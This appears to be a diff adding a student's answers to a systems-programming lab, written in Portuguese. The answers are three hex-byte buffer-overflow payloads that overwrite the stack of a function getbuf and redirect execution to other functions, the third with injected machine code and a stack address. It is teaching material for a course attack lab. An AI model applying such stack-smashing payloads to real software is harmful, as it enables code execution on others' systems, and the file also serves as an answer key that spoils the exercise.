@@ -1,0 +1,34 @@
+Laboratório 12 Software Básico 2023.1
+
+1-) stringinvasora:
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+03 12 40 00 00 00 00 00
+
+temos 32 bytes para sobrescrever a pilha da função getbuf, 8 para sobescrever rbp e agora restaria somente o endereço de danger.
+
+
+2-) stringinvasora2:
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+03 12 40 00 00 00 00 00
+5e 12 40 00 00 00 00 00
+
+3-)stringinvasora3:
+
+bf 04 03 02 01 c3 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+a0 da ff ff ff 7f 00 00
+7c 12 40 00 00 00 00 00
+
